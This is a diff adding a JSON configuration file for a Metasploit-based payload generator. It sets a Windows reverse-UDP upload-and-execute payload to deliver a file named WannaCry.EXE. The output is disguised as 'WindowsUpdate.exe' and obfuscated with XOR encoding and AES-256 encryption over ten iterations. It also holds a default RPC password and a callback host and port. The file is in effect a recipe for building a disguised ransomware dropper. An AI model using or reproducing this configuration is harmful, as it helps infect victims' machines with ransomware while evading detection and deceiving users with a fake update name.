@@ -1,0 +1,18 @@
+{
+	"metasploit_password": "admin",
+	"metasploit_server_port": "55553",
+	"metasploit_server_host": "127.0.0.1",
+	"Host": "127.0.0.1",
+	"Port": "4444",
+	"Payload": "windows/upexec/reverse_udp",
+	"FILE_PATH_TO_EXECUTE": "~/Desktop/WannaCry.EXE",
+	"Output": "WindowsUpdate.exe",
+	"Output_Directory": "~/Desktop/",
+	"Format": "exe",
+	"Platform": "windows",
+	"Encoder": "x86/xor_dynamic",
+	"Encryption": "aes256",
+	"Iteration": "10",
+	"EXITFUNC": "process"
+}
+
